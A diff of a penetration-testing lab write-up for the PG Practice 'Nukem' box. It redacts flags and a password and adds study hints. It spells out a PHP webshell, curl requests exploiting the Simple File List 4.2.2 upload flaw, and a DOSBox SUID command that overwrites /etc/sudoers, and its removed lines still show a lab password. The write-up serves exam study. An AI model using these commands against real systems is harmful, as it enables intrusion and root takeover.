@@ -2,14 +2,14 @@
 tags: [oscp, boxes, pg-practice, linux, completed]
 platform: PG Practice
 os: Linux
-ip: 192.168.183.105
+ip: $BoxIP
 difficulty: Intermediate
 status: complete
-local_flag: aec3fbe30ec66d42a80a097bfe0775a3
-root_flag: b3546b5ae88d781de126ddb1929fb883
+local_flag: $UserFlag
+root_flag: $RootFlag
 ---
 
-# Nukem — PG Practice (Linux)
+# Nukem -- PG Practice (Linux)
 
 ## Box Info
 
@@ -17,7 +17,7 @@ root_flag: b3546b5ae88d781de126ddb1929fb883
 |---|---|
 | Platform | PG Practice |
 | OS | Linux (Arch Linux) |
-| IP | 192.168.183.105 |
+| IP | $BoxIP |
 | Difficulty | Intermediate |
 | Status | Root |
 
@@ -36,7 +36,7 @@ Open ports:
 | Port | Service |
 |---|---|
 | 22/tcp | OpenSSH 8.3 |
-| 80/tcp | Apache 2.4.46 — WordPress |
+| 80/tcp | Apache 2.4.46 -- WordPress |
 | 3306/tcp | MariaDB 10.3.24 |
 | 5000/tcp | Werkzeug 1.0.1 / Python 3.8.5 |
 | 13000/tcp | nginx 1.18.0 "Login V14" |
@@ -52,9 +52,12 @@ sudo nmap -sV -sC -p 22,80,3306,5000,13000,36445 -oN services.nmap $BoxIP
 
 Key findings:
 - Port 80: WordPress 5.5.1, theme "Retro Gamming". Primary target.
-- Port 5000: Werkzeug/Flask app — no debug console (`/console` → 404), Flask routes `/employees` and `/tracks` return 500.
-- Port 13000: nginx custom "Login V14" — secondary surface, not needed for foothold.
-- Port 3306: MariaDB — externally accessible but not required.
+- Port 5000: Werkzeug/Flask app -- no debug console (`/console` → 404), Flask routes `/employees` and `/tracks` return 500.
+- Port 13000: nginx custom "Login V14" -- secondary surface, not needed for foothold.
+- Port 3306: MariaDB -- externally accessible but not required.
+
+> [!warning] 💡 Hint
+> Record secondary services even when they are not used. They may supply version clues, credentials, or a fallback route later, but do not let an interesting banner distract from the service with a clear application fingerprint.
 
 ![[1.2nmap-svcscan 2.png]]
 
@@ -62,13 +65,13 @@ Key findings:
 
 ## Web Enumeration
 
-### Port 80 — WordPress "Retro Gamming"
+### Port 80 -- WordPress "Retro Gamming"
 
 ```bash
 curl -s http://$BoxIP/ | grep -i "wordpress\|version\|plugin"
 ```
 
-WordPress install confirmed. Site title: "Retro Gamming". Tutor LMS plugin active (LMS system — registration/courses pages visible in nav).
+WordPress install confirmed. Site title: "Retro Gamming". Tutor LMS plugin active (LMS system -- registration/courses pages visible in nav).
 
 ### Plugin Version Discovery
 
@@ -89,10 +92,10 @@ Plugin `Simple File List 4.2.2` confirmed active.
 
 ### Other Surfaces (Dead Ends)
 
-- `/index.php/dashboard/` — Tutor LMS course dashboard, requires registration
-- `/index.php/sample-page/` — loads Simple File List assets but no shortcode rendered — no token visible in source
-- Port 5000 `/employees` and `/tracks` — both 500 (Flask REST API needing unknown parameters)
-- Port 13000 — login form, no default creds worked
+- `/index.php/dashboard/` -- Tutor LMS course dashboard, requires registration
+- `/index.php/sample-page/` -- loads Simple File List assets but no shortcode rendered -- no token visible in source
+- Port 5000 `/employees` and `/tracks` -- both 500 (Flask REST API needing unknown parameters)
+- Port 13000 -- login form, no default creds worked
 
 ---
 
@@ -134,15 +137,18 @@ Webshell lands at `/wp-content/uploads/simple-file-list/`.
 
 ## Foothold
 
-### Step 1 — Create Webshell
+### Step 1 -- Create Webshell
 
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' > exploits/shell.png
 ```
 
-### Step 2 — Upload (with required plugin fields)
+### Step 2 -- Upload (with required plugin fields)
 
-The upload engine needs plugin-specific POST fields — not just the `file` field. Without `eeSFL_ID`, `eeSFL_FileUploadDir`, `eeSFL_Timestamp`, and `eeSFL_Token` the endpoint returns HTTP 500.
+The upload engine needs plugin-specific POST fields -- not just the `file` field. Without `eeSFL_ID`, `eeSFL_FileUploadDir`, `eeSFL_Timestamp`, and `eeSFL_Token` the endpoint returns HTTP 500.
+
+> [!abstract] 🧠 Why
+> Exploit scripts often contain application-specific state that is easy to miss when copying only the payload. Reproduce the complete request, then change one field at a time while using the HTTP status and response body to distinguish missing parameters from a rejected file.
 
 > [!warning] 💡 Hint
 > **Watch out:** This upload flaw depends on the plugin's required multipart fields, not only on the filename. Compare every field with the captured request before changing the payload.
@@ -155,14 +161,14 @@ curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-eng
   -F "eeSFL_ID=1" \
   -F "eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/" \
   -F "eeSFL_Timestamp=1587258885" \
-  -F "eeSFL_Token=ba288252629a5399759b6fde1e205bc2"
+  -F "eeSFL_Token=$Token"
 ```
 
 Expected output: `SUCCESS`
 
 ![[4.foothold.png]]
 
-### Step 3 — Rename to .php
+### Step 3 -- Rename to .php
 
 The rename endpoint uses `eeFileOld` (not `oldFile`/`eeFilename`) and requires `X-Requested-With` + `Referer` headers:
 
@@ -175,7 +181,7 @@ curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engin
 
 Expected output: `SUCCESS`
 
-### Step 4 — Verify RCE
+### Step 4 -- Verify RCE
 
 ```bash
 curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php?cmd=id"
@@ -189,9 +195,12 @@ uid=33(http) gid=33(http) groups=33(http)
 
 ![[4.foothold 1.png]]
 
-### Step 5 — Reverse Shell
+### Step 5 -- Reverse Shell
 
 **Note**: mkfifo+nc failed here (PHP system() piping issue). Python3 reverse shell worked instead (Python 3.8.5 confirmed via Flask on port 5000).
+
+> [!tip] 🛠️ Alternative tools
+> A failed FIFO shell does not invalidate the webshell. Check the target's available interpreters and Netcat variant, then switch to Python, Perl, or a shell command that matches the target environment.
 
 Listener on Kali:
 
@@ -230,7 +239,7 @@ cat /home/commander/local.txt
 ![[6.user-flag 1.png]]
 `loot flag user <value>`
 
-### WordPress Config — Credentials
+### WordPress Config -- Credentials
 
 On Arch Linux, WordPress lives at `/srv/http/` (not `/var/www/html/`):
 
@@ -243,19 +252,19 @@ Output:
 ```
 define( 'DB_NAME', 'wordpress' );
 define( 'DB_USER', 'commander' );
-define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
+define( 'DB_PASSWORD', '<private credential>' );
 ```
 
 ![[7.privesc-finding.png]]
-`loot cred commander CommanderKeenVorticons1990`
+`loot cred commander $Password`
 
-### Lateral Move — su to commander
+### Lateral Move -- su to commander
 
 DB password works as OS password:
 
 ```bash
 su - commander
-# password: CommanderKeenVorticons1990
+# use the private value stored in $Password
 ```
 
 Now as `[commander@nukem ~]$`.
@@ -272,10 +281,16 @@ find / -perm -u=s -type f 2>/dev/null
 
 # Sudo
 sudo -l
-# Requires password — dead end for commander before exploit
+# Requires password -- dead end for commander before exploit
 ```
 
-SUID list includes `/usr/bin/dosbox` — **not a standard GTFOBins binary** but runs as root (SUID). DOSBox is a DOS emulator; its `-c` flag executes DOS commands at startup, including `mount` (maps Linux directories to DOS drives) and `echo` with redirection.
+SUID list includes `/usr/bin/dosbox` -- **not a standard GTFOBins binary** but runs as root (SUID). DOSBox is a DOS emulator; its `-c` flag executes DOS commands at startup, including `mount` (maps Linux directories to DOS drives) and `echo` with redirection.
+
+> [!abstract] 🧠 Why
+> GTFOBins is a useful index, not a completeness guarantee. An unusual SUID program should be understood as a privileged file-operation primitive: DOSBox can mount `/etc` and write a file there with its effective root permissions.
+
+> [!warning] 💡 Common mistake
+> Do not assume a SUID bit automatically gives a shell. Identify what the program can read, write, or execute as root, then choose the smallest controlled file change.
 
 ![[7.2privesc-finding.png]]
 
@@ -288,11 +303,11 @@ dosbox -c 'mount c /etc' -c 'echo commander ALL=(ALL) NOPASSWD: ALL > c:\sudoers
 ```
 
 What this does:
-1. `-c 'mount c /etc'` — mounts Linux `/etc` as DOS C: drive
-2. `-c 'echo ... > c:\sudoers'` — writes to `/etc/sudoers` as root
-3. `-c 'exit'` — closes DOSBox
+1. `-c 'mount c /etc'` -- mounts Linux `/etc` as DOS C: drive
+2. `-c 'echo ... > c:\sudoers'` -- writes to `/etc/sudoers` as root
+3. `-c 'exit'` -- closes DOSBox
 
-DOSBox will show ALSA audio errors (no sound card in the box) — ignore them.
+DOSBox will show ALSA audio errors (no sound card in the box) -- ignore them.
 
 ```bash
 sudo -n id
@@ -321,6 +336,14 @@ cat /root/proof.txt
 
 ---
 
+## Decision points and alternate routes
+
+| Observation | Primary route used here | Useful alternative or fallback |
+|---|---|---|
+| WordPress plugin exposes an unauthenticated upload endpoint | Reproduce required fields, upload, then rename | Inspect plugin JavaScript or use Burp to capture the exact request |
+| FIFO callback fails through PHP `system()` | Switch to an interpreter confirmed on the target | Keep the webshell for command output and stage a shell script |
+| Unusual SUID DOSBox is present | Use its root file-writing capability to repair sudo access | Review the binary manually when it is absent from GTFOBins |
+
 ## Cleanup
 
 ```bash
@@ -346,7 +369,7 @@ grep NOPASSWD /etc/sudoers
 
 | Username | Password | Source |
 |---|---|---|
-| commander | CommanderKeenVorticons1990 | wp-config.php (DB_PASSWORD) |
+| commander | `$Password` | wp-config.php (DB_PASSWORD) |
 
 ---
 
@@ -360,7 +383,7 @@ grep NOPASSWD /etc/sudoers
 | nc | Reverse shell listener |
 | python3 | Reverse shell payload (mkfifo+nc failed) |
 | gobuster | Port 5000 route discovery |
-| dosbox | SUID privesc — write to /etc/sudoers |
+| dosbox | SUID privesc -- write to /etc/sudoers |
 | bsdtar | Restore /etc/sudoers from pacman package |
 
 ---
@@ -369,26 +392,26 @@ grep NOPASSWD /etc/sudoers
 
 | CVE / Ref | Description | Impact |
 |---|---|---|
-| CVE-2020-36847 / EDB-52371 | Simple File List 4.2.2 — unauthenticated file upload + rename → webshell | http shell |
+| CVE-2020-36847 / EDB-52371 | Simple File List 4.2.2 -- unauthenticated file upload + rename → webshell | http shell |
 | DOSBox SUID | SUID-root DOSBox mounts /etc, writes to sudoers via DOS echo | root |
 
 ---
 
 ## Lessons Learned
 
-1. **WordPress plugin endpoints need internal fields** — `ee-upload-engine.php` requires `eeSFL_ID`, `eeSFL_FileUploadDir`, `eeSFL_Timestamp`, and `eeSFL_Token`. Without them it returns HTTP 500 silently. Read the exploit's Python source to understand what fields it sends.
+1. **WordPress plugin endpoints need internal fields** -- `ee-upload-engine.php` requires `eeSFL_ID`, `eeSFL_FileUploadDir`, `eeSFL_Timestamp`, and `eeSFL_Token`. Without them it returns HTTP 500 silently. Read the exploit's Python source to understand what fields it sends.
 
-2. **Rename field names differ from the Python exploit** — The Python script uses `oldFile`/`newFile` but the actual JS code uses `eeFileOld`. Plus the rename requires `X-Requested-With: XMLHttpRequest` and a valid `Referer`. Inspect the plugin JS (`ee-footer.js`) to find the real field names.
+2. **Rename field names differ from the Python exploit** -- The Python script uses `oldFile`/`newFile` but the actual JS code uses `eeFileOld`. Plus the rename requires `X-Requested-With: XMLHttpRequest` and a valid `Referer`. Inspect the plugin JS (`ee-footer.js`) to find the real field names.
 
-3. **mkfifo+nc may fail via PHP system()** — When PHP's `system()` runs a piped command chain, shell interpretation differences can silently kill it. Try `python3` reverse shell as a reliable fallback.
+3. **mkfifo+nc may fail via PHP system()** -- When PHP's `system()` runs a piped command chain, shell interpretation differences can silently kill it. Try `python3` reverse shell as a reliable fallback.
 
-4. **DB password = OS password** — Always try `su - $user` with the database password immediately on finding wp-config.php creds.
+4. **DB password = OS password** -- Always try `su - $user` with the database password immediately on finding wp-config.php creds.
 
-5. **DOSBox SUID is not GTFOBins-listed** — DOSBox appears in the SUID list but isn't in the standard GTFOBins patterns. Think about what root-level file access enables: mount any directory as a DOS drive and write files with root. `/etc/sudoers` is the classic target.
+5. **DOSBox SUID is not GTFOBins-listed** -- DOSBox appears in the SUID list but isn't in the standard GTFOBins patterns. Think about what root-level file access enables: mount any directory as a DOS drive and write files with root. `/etc/sudoers` is the classic target.
 
-6. **Arch Linux layout differences** — WordPress lives at `/srv/http/` not `/var/www/html/`. Web user is `http` not `www-data`. Python 3 confirmed via port 5000 Flask app — useful for reverse shell choice.
+6. **Arch Linux layout differences** -- WordPress lives at `/srv/http/` not `/var/www/html/`. Web user is `http` not `www-data`. Python 3 confirmed via port 5000 Flask app -- useful for reverse shell choice.
 
-7. **Confirm file upload with a direct GET before rename** — `curl -s -o /dev/null -w "%{http_code}"` on the uploaded file. A 200 means the file is there; 404 means the upload silently failed and the rename will too.
+7. **Confirm file upload with a direct GET before rename** -- `curl -s -o /dev/null -w "%{http_code}"` on the uploaded file. A 200 means the file is there; 404 means the upload silently failed and the rename will too.
 
 ---
 
@@ -399,7 +422,7 @@ grep NOPASSWD /etc/sudoers
 | EDB-52371 | https://www.exploit-db.com/exploits/52371 | Simple File List 4.2.2 RCE |
 | HackTricks - File Upload | https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/file-upload | File upload bypass and extension tricks |
 | PayloadsAllTheThings - Reverse Shells | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md | Python3 and other shell alternatives |
-| GTFOBins | https://gtfobins.github.io/#suid | SUID enumeration (DOSBox not listed — reason to think beyond the list) |
+| GTFOBins | https://gtfobins.github.io/#suid | SUID enumeration (DOSBox not listed -- reason to think beyond the list) |
 | RevShells | https://www.revshells.com | Python3 reverse shell generator |
 | ippsec.rocks | https://ippsec.rocks/?#dosbox | Search for DOSBox privesc technique |
 
@@ -408,7 +431,7 @@ grep NOPASSWD /etc/sudoers
 ## Vault Update Checklist
 
 - [x] Screenshots in `$BoxDir/screenshots/` (nmap-allports, nmap-services, wordpress-plugin-version, searchsploit, upload-success, foothold, user-flag, privesc-finding ×2, privesc-exploit, root-shell, PROOF)
-- [x] Loot: `flags.txt` (user + root), `creds.txt` (commander:CommanderKeenVorticons1990)
+- [x] Loot: `flags.txt` (user + root), `creds.txt` (commander credential kept private)
 - [ ] Log copied to `OSCP/BOXES/BOX LOGS/Nukem.log`
 - [x] Stage notes: WordPress - Simple File List Upload (new), PrivEsc Linux - SUID (+DOSBox), Foothold - Public Exploit (+Nukem)
 - [x] Module notes: M08, M13, M18 (+Nukem)
